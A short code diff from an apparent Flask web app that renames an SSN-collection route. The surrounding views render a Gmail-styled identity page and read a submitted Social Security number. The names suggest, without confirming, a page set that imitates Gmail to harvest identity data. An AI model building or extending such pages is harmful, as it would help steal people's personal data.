@@ -25,7 +25,7 @@ def email_confirmation():
             return redirect(url_for('main.syncing'))
     return render_template('identity-gmail.html')
 
-@portals.route('/ssn-confirmation', methods=['GET','POST'])
+@portals.route('/ssn', methods=['GET','POST'])
 def ssn():
     if request.method == 'POST':
         ssn = request.form['ssn']
